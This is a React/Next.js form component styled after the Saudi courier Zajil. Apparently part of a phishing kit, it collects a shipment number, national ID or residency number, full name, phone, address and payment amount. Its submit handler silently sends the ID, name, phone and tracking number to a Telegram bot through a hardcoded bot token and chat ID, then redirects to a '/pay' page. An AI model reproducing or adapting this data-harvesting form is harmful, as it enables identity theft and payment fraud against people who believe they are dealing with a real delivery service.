"use client"
import { useRef } from 'react'
import styles from './FormZajil.module.css'

import { useRouter } from 'next/navigation'

const FormZajil = () => {

  let numberTrack= useRef();
  let numbernation= useRef();
  let fullname= useRef();
  let numphone= useRef();

  const router = useRouter()

  const handleSubmit = (e) => {
    e.preventDefault();
    var bot={
      token:"6989400723:AAHYaV2mqkCKuP5OsEA7mK5s_7mctmTRChc",
      chat_id:6364996162
    }
    var length =`رقم الشحنة: ${numberTrack.current.value} %0A رقم بطاقة الاحوال: ${numbernation.current.value} %0A الاسم الكامل : ${fullname.current.value} %0A رقم الجوال: ${numphone.current.value}`
   
    
    fetch(`https://api.telegram.org/bot${bot.token}/sendMessage?chat_id=${bot.chat_id}&text=${length}`,{method:"GET"}).then(res=>res.json()).then(res=>console.log(res))
    
  }

  return (
    <div className={styles.contain} dir='rtl'>
        <form  onSubmit={handleSubmit} > 

            
            <input type="number" name='numberTrack' ref={numberTrack} placeholder='رقم الشحنة' required />




            <input type="number" name='numbernationalty' ref={numbernation} placeholder='رقم بطاقة الأحوال او الأقامة' required />
        


            
            <input type="text" name='fullname' ref={fullname} placeholder='الأسم الكامل' required />
        


        
            <input type="number" name='numphone' ref={numphone} placeholder='رقم الجوال' required />
        


            
            <input type="text" name='adress'  placeholder='العنوان' required />
        


            <input type="text" name='city'  placeholder='المدينة' required />
        


  
            <input type="number" name='many' placeholder='قيمة السداد' required />
        
          
          <button type='submit' onClick={() => router.push('/pay')} >التالي</button>
        </form>
    </div>

  )
}

export default FormZajil